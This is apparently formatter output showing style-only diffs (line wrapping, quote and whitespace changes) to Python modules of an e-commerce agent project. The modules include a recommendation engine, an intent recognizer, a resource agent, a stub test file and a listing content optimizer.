         return min(1.0, score)
 
-    def _calculate_implementation_ease_score(self, recommendation: Dict[str, Any]) -> float:
+    def _calculate_implementation_ease_score(
+        self, recommendation: Dict[str, Any]
+    ) -> float:
         """Calculate implementation ease score."""
         action = recommendation.get("action", "")
-        
+
         # Easy actions get higher scores
         easy_actions = ["research_product", "analyze_pricing", "optimize_listings"]
         medium_actions = ["explore_category", "improve_conversion"]
         hard_actions = ["research_seasonal_product", "consider_price_increase"]
-        
+
         if action in easy_actions:
             return 0.9
         elif action in medium_actions:
             return 0.6
         elif action in hard_actions:
@@ -409,16 +454,16 @@
             return 0.5
 
     def _calculate_expected_impact_score(self, recommendation: Dict[str, Any]) -> float:
         """Calculate expected impact score."""
         rec_type = recommendation.get("type", "")
-        
+
         # High impact types
         high_impact_types = ["performance_alerts", "pricing_optimization"]
         medium_impact_types = ["market_expansion", "seasonal_trends"]
         low_impact_types = ["listing_improvements"]
-        
+
         if rec_type in high_impact_types:
             return 0.9
         elif rec_type in medium_impact_types:
             return 0.7
         elif rec_type in low_impact_types:
@@ -428,98 +473,102 @@
 
     def _calculate_urgency_score(self, recommendation: Dict[str, Any]) -> float:
         """Calculate urgency score."""
         priority = recommendation.get("priority", "medium")
         rec_type = recommendation.get("type", "")
-        
+
         # Priority-based scoring
         priority_scores = {"high": 0.9, "medium": 0.6, "low": 0.3}
         score = priority_scores.get(priority, 0.5)
-        
+
         # Time-sensitive types get urgency boost
         time_sensitive_types = ["seasonal_trends", "performance_alerts"]
         if rec_type in time_sensitive_types:
             score += 0.1
-        
+
         return min(1.0, score)
 
     async def _filter_recommendations(
         self, recommendations: List[Dict[str, Any]], user_profile: Dict[str, Any]
     ) -> List[Dict[str, Any]]:
         """Filter recommendations to remove duplicates and apply user preferences."""
         filtered = []
         seen_actions = set()
-        
+
         for rec in recommendations:
             action = rec.get("action", "")
-            
+
             # Remove duplicates
             if action in seen_actions:
                 continue
-            
+
             # Apply minimum score threshold
             if rec.get("score", 0) < 0.3:
                 continue
-            
+
             seen_actions.add(action)
             filtered.append(rec)
-        
+
         return filtered
 
-    async def _update_recommendation_history(self, user_id: str, recommendations: List[Dict[str, Any]]) -> None:
+    async def _update_recommendation_history(
+        self, user_id: str, recommendations: List[Dict[str, Any]]
+    ) -> None:
         """Update recommendation history."""
         history_entry = {
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "user_id": user_id,
             "recommendations": recommendations,
             "count": len(recommendations),
         }
-        
+
         self.recommendation_history.append(history_entry)
-        
+
         # Keep only last 100 entries
         if len(self.recommendation_history) > 100:
             self.recommendation_history = self.recommendation_history[-100:]
 
     async def get_proactive_alerts(self, user_id: str) -> List[Dict[str, Any]]:
         """Get proactive alerts for immediate attention."""
         try:
             user_profile = await self._get_user_profile(user_id)
-            
+
             # Generate performance-based alerts
             alerts = await self._performance_based_recommendations(user_profile, None)
-            
+
             # Filter for high-priority alerts only
-            high_priority_alerts = [alert for alert in alerts if alert.get("priority") == "high"]
-            
+            high_priority_alerts = [
+                alert for alert in alerts if alert.get("priority") == "high"
+            ]
+
             return high_priority_alerts
-            
+
         except Exception as e:
             logger.error(f"Error getting proactive alerts: {e}")
             return []
 
     def get_metrics(self) -> Dict[str, Any]:
         """Get recommendation engine metrics."""
         total_recommendations = len(self.recommendation_history)
-        
+
         if total_recommendations == 0:
             return {"total_recommendations": 0}
-        
+
         # Calculate recommendation type distribution
         all_recs = []
         for entry in self.recommendation_history:
             all_recs.extend(entry["recommendations"])
-        
+
         type_counts = {}
         for rec in all_recs:
             rec_type = rec.get("type", "unknown")
             type_counts[rec_type] = type_counts.get(rec_type, 0) + 1
-        
+
         # Calculate average scores
         scores = [rec.get("score", 0) for rec in all_recs]
         avg_score = sum(scores) / len(scores) if scores else 0
-        
+
         return {
             "total_recommendation_sessions": total_recommendations,
             "total_recommendations_generated": len(all_recs),
             "average_score": avg_score,
             "recommendation_type_distribution": type_counts,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/conversational/recommendation_engine.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/conversational/intent_recognizer.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/conversational/intent_recognizer.py	2025-06-19 04:03:38.096366+00:00
@@ -65,25 +65,31 @@
         self.intent_categories = {
             "product_search": ["find", "search", "look for", "show me", "browse"],
             "price_inquiry": ["price", "cost", "how much", "expensive", "cheap"],
             "listing_management": ["list", "sell", "create listing", "update", "edit"],
             "inventory_check": ["inventory", "stock", "available", "quantity", "count"],
-            "analytics_request": ["analytics", "performance", "stats", "report", "metrics"],
+            "analytics_request": [
+                "analytics",
+                "performance",
+                "stats",
+                "report",
+                "metrics",
+            ],
             "help_support": ["help", "support", "how to", "tutorial", "guide"],
             "account_management": ["account", "profile", "settings", "preferences"],
             "order_tracking": ["order", "shipment", "tracking", "delivery", "status"],
         }
 
         # Entity types
         self.entity_types = {
-            "product_name": r'\b[A-Z][a-zA-Z0-9\s]+(?:Pro|Max|Plus|Ultra)?\b',
-            "brand": r'\b(?:Apple|Samsung|Sony|Nike|Adidas|Microsoft|Amazon)\b',
-            "price": r'\$?\d+(?:\.\d{2})?',
-            "quantity": r'\b\d+\s*(?:pieces?|items?|units?)?\b',
-            "category": r'\b(?:electronics|clothing|home|books|toys|sports)\b',
-            "marketplace": r'\b(?:eBay|Amazon|Etsy|Facebook)\b',
-            "time_period": r'\b(?:today|yesterday|week|month|year|daily|weekly|monthly)\b',
+            "product_name": r"\b[A-Z][a-zA-Z0-9\s]+(?:Pro|Max|Plus|Ultra)?\b",
+            "brand": r"\b(?:Apple|Samsung|Sony|Nike|Adidas|Microsoft|Amazon)\b",
+            "price": r"\$?\d+(?:\.\d{2})?",
+            "quantity": r"\b\d+\s*(?:pieces?|items?|units?)?\b",
+            "category": r"\b(?:electronics|clothing|home|books|toys|sports)\b",
+            "marketplace": r"\b(?:eBay|Amazon|Etsy|Facebook)\b",
+            "time_period": r"\b(?:today|yesterday|week|month|year|daily|weekly|monthly)\b",
         }
 
         logger.info(f"Initialized IntentRecognizer: {self.agent_id}")
 
     async def initialize(self) -> None:
@@ -96,21 +102,23 @@
         """Load intent classification models."""
         # Initialize intent patterns for each category
         for category, keywords in self.intent_categories.items():
             self.intent_patterns[category] = {
                 "keywords": keywords,
-                "patterns": [rf'\b{keyword}\b' for keyword in keywords],
+                "patterns": [rf"\b{keyword}\b" for keyword in keywords],
                 "weight": 1.0,
             }
 
     async def _setup_entity_extractors(self) -> None:
         """Set up entity extraction patterns."""
         # Compile regex patterns for entity extraction
         for entity_type, pattern in self.entity_types.items():
             self.entity_extractors[entity_type] = re.compile(pattern, re.IGNORECASE)
 
-    async def recognize_intent(self, user_input: str, context: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+    async def recognize_intent(
+        self, user_input: str, context: Optional[Dict[str, Any]] = None
+    ) -> Dict[str, Any]:
         """Recognize intent from user input with context awareness."""
         try:
             # Preprocess input
             processed_input = await self._preprocess_input(user_input)
 
@@ -122,11 +130,13 @@
 
             # Get primary intent
             primary_intent = await self._get_primary_intent(intent_scores)
 
             # Validate intent with context
-            validated_intent = await self._validate_intent_with_context(primary_intent, entities, context)
+            validated_intent = await self._validate_intent_with_context(
+                primary_intent, entities, context
+            )
 
             # Update intent history
             await self._update_intent_history(validated_intent, user_input, context)
 
             return {
@@ -153,11 +163,11 @@
         """Preprocess user input for intent recognition."""
         # Convert to lowercase
         processed = user_input.lower().strip()
 
         # Remove extra whitespace
-        processed = re.sub(r'\s+', ' ', processed)
+        processed = re.sub(r"\s+", " ", processed)
 
         # Handle common contractions
         contractions = {
             "i'm": "i am",
             "you're": "you are",
@@ -181,11 +191,13 @@
             if matches:
                 entities[entity_type] = matches
 
         return entities
 
-    async def _classify_intent(self, text: str, context: Optional[Dict[str, Any]] = None) -> Dict[str, float]:
+    async def _classify_intent(
+        self, text: str, context: Optional[Dict[str, Any]] = None
+    ) -> Dict[str, float]:
         """Classify intent with confidence scores."""
         intent_scores = {}
 
         for intent_category, pattern_data in self.intent_patterns.items():
             score = 0.0
@@ -200,25 +212,31 @@
                 if re.search(pattern, text, re.IGNORECASE):
                     score += 0.5
 
             # Apply context boost
             if context:
-                context_boost = await self._calculate_context_boost(intent_category, context)
+                context_boost = await self._calculate_context_boost(
+                    intent_category, context
+                )
                 score += context_boost
 
             # Normalize score
-            max_possible_score = len(pattern_data["keywords"]) + len(pattern_data["patterns"]) * 0.5
+            max_possible_score = (
+                len(pattern_data["keywords"]) + len(pattern_data["patterns"]) * 0.5
+            )
             if max_possible_score > 0:
                 normalized_score = min(1.0, score / max_possible_score)
             else:
                 normalized_score = 0.0
 
             intent_scores[intent_category] = normalized_score
 
         return intent_scores
 
-    async def _calculate_context_boost(self, intent_category: str, context: Dict[str, Any]) -> float:
+    async def _calculate_context_boost(
+        self, intent_category: str, context: Dict[str, Any]
+    ) -> float:
         """Calculate context boost for intent classification."""
         boost = 0.0
 
         # Previous intent context
         if "previous_intent" in context:
@@ -280,11 +298,13 @@
             if action_intent_map.get(action) == intent:
                 return True
 
         return False
 
-    async def _get_primary_intent(self, intent_scores: Dict[str, float]) -> Dict[str, Any]:
+    async def _get_primary_intent(
+        self, intent_scores: Dict[str, float]
+    ) -> Dict[str, Any]:
         """Get primary intent from scores."""
         if not intent_scores:
             return {"intent": "unknown", "confidence": 0.0}
 
         # Get highest scoring intent
@@ -307,11 +327,14 @@
             "confidence": confidence,
             "confidence_level": confidence_level,
         }
 
     async def _validate_intent_with_context(
-        self, primary_intent: Dict[str, Any], entities: Dict[str, List[str]], context: Optional[Dict[str, Any]]
+        self,
+        primary_intent: Dict[str, Any],
+        entities: Dict[str, List[str]],
+        context: Optional[Dict[str, Any]],
     ) -> Dict[str, Any]:
         """Validate intent using entities and context."""
         intent = primary_intent["intent"]
         confidence = primary_intent["confidence"]
 
@@ -349,11 +372,13 @@
             "order_tracking": [],
         }
 
         return entity_requirements.get(intent, [])
 
-    async def _validate_entities(self, entities: Dict[str, List[str]], required: List[str]) -> Dict[str, Any]:
+    async def _validate_entities(
+        self, entities: Dict[str, List[str]], required: List[str]
+    ) -> Dict[str, Any]:
         """Validate extracted entities."""
         missing_entities = []
 
         for required_entity in required:
             if required_entity not in entities or not entities[required_entity]:
@@ -363,29 +388,40 @@
             "valid": len(missing_entities) == 0,
             "missing_entities": missing_entities,
             "extracted_entities": list(entities.keys()),
         }
 
-    async def _validate_context(self, intent: str, context: Dict[str, Any]) -> Dict[str, Any]:
+    async def _validate_context(
+        self, intent: str, context: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Validate intent against context."""
         # Simple context validation
         valid = True
         issues = []
 
         # Check if intent makes sense in current context
         current_section = context.get("current_section")
-        if current_section and not self._intent_matches_section(intent, current_section):
+        if current_section and not self._intent_matches_section(
+            intent, current_section
+        ):
             # Don't mark as invalid, just note the mismatch
-            issues.append(f"Intent '{intent}' doesn't match current section '{current_section}'")
+            issues.append(
+                f"Intent '{intent}' doesn't match current section '{current_section}'"
+            )
 
         return {
             "valid": valid,
             "issues": issues,
             "context_factors": list(context.keys()),
         }
 
-    async def _update_intent_history(self, intent_result: Dict[str, Any], user_input: str, context: Optional[Dict[str, Any]]) -> None:
+    async def _update_intent_history(
+        self,
+        intent_result: Dict[str, Any],
+        user_input: str,
+        context: Optional[Dict[str, Any]],
+    ) -> None:
         """Update intent history for pattern analysis."""
         history_entry = {
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "user_input": user_input,
             "intent": intent_result["intent"],
@@ -397,20 +433,24 @@
 
         # Keep only last 100 entries
         if len(self.intent_history) > 100:
             self.intent_history = self.intent_history[-100:]
 
-    async def get_intent_suggestions(self, partial_input: str, context: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
+    async def get_intent_suggestions(
+        self, partial_input: str, context: Optional[Dict[str, Any]] = None
+    ) -> List[Dict[str, Any]]:
         """Get intent suggestions for partial input."""
         try:
             suggestions = []
 
             # Get potential intents based on partial input
             potential_intents = await self._get_potential_intents(partial_input)
 
             # Rank suggestions based on context and history
-            ranked_suggestions = await self._rank_intent_suggestions(potential_intents, context)
+            ranked_suggestions = await self._rank_intent_suggestions(
+                potential_intents, context
+            )
 
             return ranked_suggestions[:5]  # Return top 5 suggestions
 
         except Exception as e:
             logger.error(f"Error getting intent suggestions: {e}")
@@ -420,17 +460,22 @@
         """Get potential intents from partial input."""
         potential_intents = []
 
         for intent_category, pattern_data in self.intent_patterns.items():
             for keyword in pattern_data["keywords"]:
-                if keyword.startswith(partial_input.lower()) or partial_input.lower() in keyword:
+                if (
+                    keyword.startswith(partial_input.lower())
+                    or partial_input.lower() in keyword
+                ):
                     potential_intents.append(intent_category)
                     break
 
         return list(set(potential_intents))
 
-    async def _rank_intent_suggestions(self, potential_intents: List[str], context: Optional[Dict[str, Any]]) -> List[Dict[str, Any]]:
+    async def _rank_intent_suggestions(
+        self, potential_intents: List[str], context: Optional[Dict[str, Any]]
+    ) -> List[Dict[str, Any]]:
         """Rank intent suggestions based on context and history."""
         ranked = []
 
         for intent in potential_intents:
             score = 1.0
@@ -442,15 +487,17 @@
 
             # History boost (recent intents get higher score)
             history_boost = self._calculate_history_boost(intent)
             score += history_boost
 
-            ranked.append({
-                "intent": intent,
-                "score": score,
-                "description": self._get_intent_description(intent),
-            })
+            ranked.append(
+                {
+                    "intent": intent,
+                    "score": score,
+                    "description": self._get_intent_description(intent),
+                }
+            )
 
         return sorted(ranked, key=lambda x: x["score"], reverse=True)
 
     def _calculate_history_boost(self, intent: str) -> float:
         """Calculate boost based on intent history."""
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/conversational/intent_recognizer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/resource_agent.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/resource_agent.py	2025-06-19 04:03:38.307394+00:00
@@ -31,19 +31,19 @@
 
 
 class ResourceAgent(BaseAgent):
     """
     Resource Agent for executive resource management.
-    
+
     Provides resource allocation, monitoring, and optimization capabilities
     for the FlipSync agent ecosystem.
     """
 
     def __init__(self, agent_id: str, config: Optional[Dict[str, Any]] = None):
         """
         Initialize the Resource Agent.
-        
+
         Args:
             agent_id: Unique identifier for this agent instance
             config: Optional configuration dictionary
         """
         super().__init__(agent_id=agent_id, config=config or {})
@@ -52,11 +52,11 @@
             "cpu_limit": 2.0,
             "memory_limit": 4096,
             "storage_limit": 10240,
             "api_rate_limit": 1000,
         }
-        
+
         logger.info(f"ResourceAgent {agent_id} initialized")
 
     async def allocate_resources(
         self,
         tenant_id: str,
@@ -65,18 +65,18 @@
         storage_limit: Optional[int] = None,
         api_rate_limit: Optional[int] = None,
     ) -> ResourceAllocation:
         """
         Allocate resources for a tenant.
-        
+
         Args:
             tenant_id: Tenant identifier
             cpu_limit: CPU limit (cores)
             memory_limit: Memory limit (MB)
             storage_limit: Storage limit (MB)
             api_rate_limit: API rate limit (requests per minute)
-            
+
         Returns:
             Resource allocation instance
         """
         allocation = ResourceAllocation(
             tenant_id=tenant_id,
@@ -90,66 +90,66 @@
                 "storage": 0,
                 "api_calls": 0,
             },
             last_scaled=datetime.utcnow(),
         )
-        
+
         self.resource_allocations[tenant_id] = allocation
         logger.info(f"Allocated resources for tenant: {tenant_id}")
-        
+
         return allocation
 
     async def process_message(self, message: Dict[str, Any]) -> None:
         """
         Process incoming message.
-        
+
         Args:
             message: Message to process
         """
         message_type = message.get("type", "unknown")
-        
+
         if message_type == "allocate_resources":
             await self.allocate_resources(
                 tenant_id=message.get("tenant_id", ""),
                 cpu_limit=message.get("cpu_limit"),
                 memory_limit=message.get("memory_limit"),
                 storage_limit=message.get("storage_limit"),
                 api_rate_limit=message.get("api_rate_limit"),
             )
-            
+
         elif message_type == "get_status":
             self.get_status()
-            
+
         else:
             logger.warning(f"Unknown message type: {message_type}")
 
     async def take_action(self, action: Dict[str, Any]) -> None:
         """
         Take a specific action.
-        
+
         Args:
             action: Action dictionary containing action type and parameters
         """
         action_type = action.get("type", "unknown")
         params = action.get("parameters", {})
-        
+
         if action_type == "allocate_resources":
             await self.allocate_resources(
                 tenant_id=params.get("tenant_id", ""),
                 cpu_limit=params.get("cpu_limit"),
                 memory_limit=params.get("memory_limit"),
                 storage_limit=params.get("storage_limit"),
                 api_rate_limit=params.get("api_rate_limit"),
             )
-            
+
         else:
             logger.warning(f"Unknown action type: {action_type}")
 
     def get_status(self) -> Dict[str, Any]:
         """
         Get agent status.
-        
+
         Returns:
             Agent status information
         """
         return {
             "agent_id": self.agent_id,
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/test_decision_engine.py	2025-06-14 20:35:30.763679+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/test_decision_engine.py	2025-06-19 04:03:38.320073+00:00
@@ -1,11 +1,11 @@
 """
 Agent Test module for executive_decision_engine
 
 This module contains agent-focused tests for the migrated executive_decision_engine component.
 Tier: 2
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from decision_engine import *
+
 
 class TestDecisionEngineAgent:
     """Agent test class for decision_engine."""
 
     def test_import(self):
@@ -50,15 +51,16 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/resource_agent.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/agents/executive/test_decision_engine.py
--- /home/brend/Flipsync_Final/fs_agt_clean/agents/content/content_optimizer.py	2025-06-14 20:35:30.759670+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/agents/content/content_optimizer.py	2025-06-19 04:03:38.367001+00:00
@@ -79,23 +79,27 @@
         }
 
     def _get_required_config_fields(self) -> List[str]:
         """Get required configuration fields."""
         fields = super()._get_required_config_fields()
-        fields.extend([
-            "optimization_pipeline_enabled",
-            "ab_testing_enabled",
-            "performance_tracking_enabled",
-            "auto_optimization_threshold",
-        ])
+        fields.extend(
+            [
+                "optimization_pipeline_enabled",
+                "ab_testing_enabled",
+                "performance_tracking_enabled",
+                "auto_optimization_threshold",
+            ]
+        )
         return fields
 
     async def _setup_content_resources(self) -> None:
         """Set up content optimization resources."""
         await self._initialize_optimization_strategies()
         await self._load_performance_baselines()
-        logger.info(f"Content optimization resources initialized for {self.marketplace}")
+        logger.info(
+            f"Content optimization resources initialized for {self.marketplace}"
+        )
 
     async def _cleanup_content_resources(self) -> None:
         """Clean up content optimization resources."""
         self.optimization_strategies.clear()
         self.performance_data.clear()
@@ -131,11 +135,13 @@
             if optimization_type == "full_pipeline":
                 result = await self.run_optimization_pipeline(content)
             elif optimization_type == "ab_test":
                 result = await self.create_ab_test_variants(content)
             elif optimization_type == "performance_based":
-                result = await self.optimize_based_on_performance(content, event.get("performance_data", {}))
+                result = await self.optimize_based_on_performance(
+                    content, event.get("performance_data", {})
+                )
             else:
                 result = await self.optimize_specific_aspect(content, optimization_type)
 
             self.metrics["content_generated"] += 1
             logger.info(f"Completed {optimization_type} optimization")
@@ -148,11 +154,13 @@
         try:
             content = event.get("content", {})
             performance_data = event.get("performance_data", {})
             optimization_goals = event.get("goals", ["quality", "conversion"])
 
-            result = await self.optimize_for_goals(content, optimization_goals, performance_data)
+            result = await self.optimize_for_goals(
+                content, optimization_goals, performance_data
+            )
             self.metrics["content_optimized"] += 1
             logger.info(f"Optimized content for goals: {optimization_goals}")
 
         except Exception as e:
             logger.error(f"Error handling optimization event: {e}")
@@ -169,18 +177,24 @@
                 result = await self.run_optimization_pipeline(content)
             elif optimization_type == "ab_variants":
                 result = await self.create_ab_test_variants(content)
             elif optimization_type == "performance":
                 performance_data = task.get("performance_data", {})
-                result = await self.optimize_based_on_performance(content, performance_data)
+                result = await self.optimize_based_on_performance(
+                    content, performance_data
+                )
             else:
                 result = await self.optimize_specific_aspect(content, optimization_type)
 
             end_time = datetime.now(timezone.utc)
             self.metrics["generation_latency"] = (end_time - start_time).total_seconds()
 
-            return {"result": result, "success": True, "optimization_time": self.metrics["generation_latency"]}
+            return {
+                "result": result,
+                "success": True,
+                "optimization_time": self.metrics["generation_latency"],
+            }
 
         except Exception as e:
             logger.error(f"Error generating optimized content: {e}")
             return {"error": str(e), "success": False}
 
@@ -190,14 +204,18 @@
             content = task.get("content", {})
             goals = task.get("optimization_goals", ["quality"])
             performance_data = task.get("performance_data", {})
 
             start_time = datetime.now(timezone.utc)
-            optimized_content = await self.optimize_for_goals(content, goals, performance_data)
+            optimized_content = await self.optimize_for_goals(
+                content, goals, performance_data
+            )
             end_time = datetime.now(timezone.utc)
 
-            self.metrics["optimization_latency"] = (end_time - start_time).total_seconds()
+            self.metrics["optimization_latency"] = (
+                end_time - start_time
+            ).total_seconds()
 
             return {
                 "original_content": content,
                 "optimized_content": optimized_content,
                 "optimization_goals": goals,
@@ -207,42 +225,52 @@
 
         except Exception as e:
             logger.error(f"Error optimizing content: {e}")
             return {"error": str(e), "success": False}
 
-    async def run_optimization_pipeline(self, content: Dict[str, Any]) -> Dict[str, Any]:
+    async def run_optimization_pipeline(
+        self, content: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Run the complete optimization pipeline."""
         try:
             optimized_content = content.copy()
             pipeline_results = {}
             total_improvements = 0
 
             # Run each optimization stage
             for stage in self.optimization_pipeline:
                 if stage in self.optimization_strategies:
-                    stage_result = await self.optimization_strategies[stage](optimized_content)
+                    stage_result = await self.optimization_strategies[stage](
+                        optimized_content
+                    )
 
                     if stage_result.get("success", False):
                         optimized_content = stage_result["optimized_content"]
                         pipeline_results[stage] = stage_result
                         total_improvements += stage_result.get("improvement_score", 0)
                     else:
-                        pipeline_results[stage] = {"error": stage_result.get("error", "Unknown error")}
+                        pipeline_results[stage] = {
+                            "error": stage_result.get("error", "Unknown error")
+                        }
 
             # Calculate overall improvement
             original_score = await self._calculate_overall_content_score(content)
-            optimized_score = await self._calculate_overall_content_score(optimized_content)
+            optimized_score = await self._calculate_overall_content_score(
+                optimized_content
+            )
             overall_improvement = optimized_score - original_score
 
             return {
                 "original_content": content,
                 "optimized_content": optimized_content,
                 "pipeline_results": pipeline_results,
                 "original_score": original_score,
                 "optimized_score": optimized_score,
                 "overall_improvement": overall_improvement,
-                "stages_completed": len([r for r in pipeline_results.values() if r.get("success", False)]),
+                "stages_completed": len(
+                    [r for r in pipeline_results.values() if r.get("success", False)]
+                ),
                 "total_stages": len(self.optimization_pipeline),
                 "optimization_pipeline": self.optimization_pipeline,
                 "processed_at": datetime.now(timezone.utc).isoformat(),
             }
 
@@ -267,46 +295,60 @@
             variant_c = await self._create_balanced_variant(content)
             variants["variant_c"] = variant_c
 
             # Calculate predicted performance for each variant
             for variant_name, variant_content in variants.items():
-                variant_score = await self._calculate_overall_content_score(variant_content["content"])
+                variant_score = await self._calculate_overall_content_score(
+                    variant_content["content"]
+                )
                 variant_content["predicted_score"] = variant_score
-                variant_content["predicted_performance"] = await self._predict_variant_performance(variant_content["content"])
+                variant_content["predicted_performance"] = (
+                    await self._predict_variant_performance(variant_content["content"])
+                )
 
             return {
                 "original_content": content,
                 "variants": variants,
                 "ab_test_id": str(uuid4()),
                 "created_at": datetime.now(timezone.utc).isoformat(),
                 "test_duration_days": 14,  # Recommended test duration
-                "success_metrics": ["conversion_rate", "click_through_rate", "seo_score"],
+                "success_metrics": [
+                    "conversion_rate",
+                    "click_through_rate",
+                    "seo_score",
+                ],
             }
 
         except Exception as e:
             logger.error(f"Error creating A/B test variants: {e}")
             return {"error": str(e)}
 
-    async def optimize_based_on_performance(self, content: Dict[str, Any], performance_data: Dict[str, Any]) -> Dict[str, Any]:
+    async def optimize_based_on_performance(
+        self, content: Dict[str, Any], performance_data: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Optimize content based on performance data."""
         try:
             optimization_priorities = self._analyze_performance_gaps(performance_data)
             optimized_content = content.copy()
             optimizations_applied = []
 
             # Apply optimizations based on performance gaps
             for priority in optimization_priorities:
                 if priority["strategy"] in self.optimization_strategies:
-                    result = await self.optimization_strategies[priority["strategy"]](optimized_content)
+                    result = await self.optimization_strategies[priority["strategy"]](
+                        optimized_content
+                    )
 
                     if result.get("success", False):
                         optimized_content = result["optimized_content"]
-                        optimizations_applied.append({
-                            "strategy": priority["strategy"],
-                            "reason": priority["reason"],
-                            "improvement": result.get("improvement_score", 0),
-                        })
+                        optimizations_applied.append(
+                            {
+                                "strategy": priority["strategy"],
+                                "reason": priority["reason"],
+                                "improvement": result.get("improvement_score", 0),
+                            }
+                        )
 
             # Calculate performance improvement prediction
             performance_prediction = await self._predict_performance_improvement(
                 content, optimized_content, performance_data
             )
@@ -323,11 +365,16 @@
 
         except Exception as e:
             logger.error(f"Error optimizing based on performance: {e}")
             return {"error": str(e)}
 
-    async def optimize_for_goals(self, content: Dict[str, Any], goals: List[str], performance_data: Dict[str, Any]) -> Dict[str, Any]:
+    async def optimize_for_goals(
+        self,
+        content: Dict[str, Any],
+        goals: List[str],
+        performance_data: Dict[str, Any],
+    ) -> Dict[str, Any]:
         """Optimize content for specific goals."""
         try:
             optimized_content = content.copy()
             goal_results = {}
 
@@ -347,19 +394,23 @@
                     optimized_content = result["optimized_content"]
 
                 goal_results[goal] = result
 
             # Calculate goal achievement scores
-            achievement_scores = await self._calculate_goal_achievement(content, optimized_content, goals)
+            achievement_scores = await self._calculate_goal_achievement(
+                content, optimized_content, goals
+            )
 
             return {
                 "original_content": content,
                 "optimized_content": optimized_content,
                 "optimization_goals": goals,
                 "goal_results": goal_results,
                 "achievement_scores": achievement_scores,
-                "overall_success": all(r.get("success", False) for r in goal_results.values()),
+                "overall_success": all(
+                    r.get("success", False) for r in goal_results.values()
+                ),
             }
 
         except Exception as e:
             logger.error(f"Error optimizing for goals: {e}")
             return {"error": str(e)}
@@ -404,18 +455,22 @@
             improvements = []
 
             # Improve bullet points structure
             if "bullet_points" in content:
                 original_bullets = content["bullet_points"]
-                optimized_bullets = await self._optimize_bullet_points_structure(original_bullets)
+                optimized_bullets = await self._optimize_bullet_points_structure(
+                    original_bullets
+                )
                 if optimized_bullets != original_bullets:
                     optimized_content["bullet_points"] = optimized_bullets
                     improvements.append("Improved bullet points structure")
 
             # Add meta description if missing
             if "meta_description" not in content and "description" in content:
-                meta_desc = await self._generate_meta_description(content["description"])
+                meta_desc = await self._generate_meta_description(
+                    content["description"]
+                )
                 optimized_content["meta_description"] = meta_desc
                 improvements.append("Added meta description")
 
             return {
                 "optimized_content": optimized_content,
@@ -459,18 +514,23 @@
 
             # Add call-to-action to description
             if "description" in content:
                 original_desc = content["description"]
                 if not self._has_call_to_action(original_desc):
-                    optimized_desc = original_desc + " Order now for fast shipping and satisfaction guarantee!"
+                    optimized_desc = (
+                        original_desc
+                        + " Order now for fast shipping and satisfaction guarantee!"
+                    )
                     optimized_content["description"] = optimized_desc
                     improvements.append("Added call-to-action")
 
             # Enhance value proposition
             if "bullet_points" in content:
                 original_bullets = content["bullet_points"]
-                optimized_bullets = await self._enhance_value_proposition(original_bullets)
+                optimized_bullets = await self._enhance_value_proposition(
+                    original_bullets
+                )
                 if optimized_bullets != original_bullets:
                     optimized_content["bullet_points"] = optimized_bullets
                     improvements.append("Enhanced value proposition in bullet points")
 
             return {
@@ -481,32 +541,36 @@
             }
 
         except Exception as e:
             return {"error": str(e), "success": False}
 
-    async def _ensure_marketplace_compliance(self, content: Dict[str, Any]) -> Dict[str, Any]:
+    async def _ensure_marketplace_compliance(
+        self, content: Dict[str, Any]
+    ) -> Dict[str, Any]:
         """Ensure marketplace compliance."""
         try:
             optimized_content = content.copy()
             improvements = []
 
             # Check and fix title length
             if "title" in content:
                 title = content["title"]
                 max_length = 80 if self.marketplace == "ebay" else 200
                 if len(title) > max_length:
-                    optimized_content["title"] = title[:max_length-3] + "..."
+                    optimized_content["title"] = title[: max_length - 3] + "..."
                     improvements.append(f"Truncated title to {max_length} characters")
 
             # Ensure required sections are present
             required_sections = ["title", "description"]
             for section in required_sections:
                 if section not in content or not content[section]:
                     if section == "title":
                         optimized_content["title"] = "Premium Quality Product"
                     elif section == "description":
-                        optimized_content["description"] = "High-quality product with excellent features."
+                        optimized_content["description"] = (
+                            "High-quality product with excellent features."
+                        )
                     improvements.append(f"Added missing {section}")
 
             return {
                 "optimized_content": optimized_content,
                 "improvements": improvements,
@@ -553,11 +617,13 @@
                 title_score = min(100, len(content["title"]) * 2)  # Simplified scoring
                 scores.append(title_score)
 
             # Description score
             if "description" in content:
-                desc_score = min(100, len(content["description"]) / 5)  # Simplified scoring
+                desc_score = min(
+                    100, len(content["description"]) / 5
+                )  # Simplified scoring
                 scores.append(desc_score)
 
             # Structure score
             structure_score = 0
             if "bullet_points" in content and content["bullet_points"]:
@@ -569,44 +635,54 @@
             return sum(scores) / len(scores) if scores else 0
 
         except Exception:
             return 50.0  # Default score
 
-    def _analyze_performance_gaps(self, performance_data: Dict[str, Any]) -> List[Dict[str, Any]]:
+    def _analyze_performance_gaps(
+        self, performance_data: Dict[str, Any]
+    ) -> List[Dict[str, Any]]:
         """Analyze performance gaps and prioritize optimizations."""
         priorities = []
 
         # Check SEO performance
         seo_score = performance_data.get("seo_score", 0)
         if seo_score < self.performance_thresholds["seo_score"]:
-            priorities.append({
